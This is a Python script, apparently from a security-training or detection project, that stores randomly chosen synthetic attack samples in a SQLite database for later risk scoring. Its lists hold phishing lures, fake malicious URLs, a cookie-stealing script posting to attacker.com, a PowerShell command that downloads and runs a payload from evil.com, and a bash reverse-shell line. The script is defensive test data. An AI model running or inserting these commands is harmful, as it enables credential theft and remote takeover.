import sqlite3
import random
import sys
import os
import time

# Add project root to sys.path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from config import DATABASE_PATH

# SAFE Educational Content Generator
PHISHING_TEMPLATES = [
    "Urgent: Your account password has expired. Click here to reset: http://fake-bank-login.com/reset",
    "Win a free iPhone 15! Claim your prize now at: http://malicious-prize- giveaway.net",
    "HR Update: excessive vacation days detected. Please review attached document.",
    "CEO Request: Wire transfer needed urgently. Confidential. Reply immediately."
]

MALICIOUS_URLS = [
    "http://paypal-secure-login.update-info.com",
    "http://google-drive-shared-file.download-malware.xyz",
    "http://admin-portal.company-internal.tk",
    "https://update-windows-patch.exe.badsite.org"
]

SUSPICIOUS_SCRIPTS = [
    "<script>document.location='http://attacker.com/cookie?c='+document.cookie;</script>",
    "powershell -NoProfile -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\"",
    "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
    "eval(base64_decode('aWYgKGlzX2FkbWluKSB7IGRlbGV0ZV9hbGxfZmlsZXMoKTsgfQ=='))"
]

def generate_attacks(num_attacks=5):
    """Generate safe synthetic attacks and store them in the database."""
    print(f"Generating {num_attacks} synthetic attacks...")
    
    conn = sqlite3.connect(DATABASE_PATH)
    cursor = conn.cursor()
    
    for _ in range(num_attacks):
        attack_type = random.choice(["Phishing Email", "Malicious URL", "Suspicious Script"])
        
        if attack_type == "Phishing Email":
            content = random.choice(PHISHING_TEMPLATES)
        elif attack_type == "Malicious URL":
            content = random.choice(MALICIOUS_URLS)
        else:
            content = random.choice(SUSPICIOUS_SCRIPTS)
            
        # Insert into DB (initial risk levels are None)
        cursor.execute('''
            INSERT INTO attacks (attack_type, content, rule_risk, openai_risk, gemini_risk, final_risk, ai_reason)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (attack_type, content, "Pending", "Pending", "Pending", "Pending", "Pending"))
        
        print(f"Generated: [{attack_type}] {content[:30]}...")
        time.sleep(0.1) # Simulate generation time

    conn.commit()
    conn.close()
    print("Attack generation complete. Data stored in SQLite.")

if __name__ == "__main__":
    generate_attacks(10)
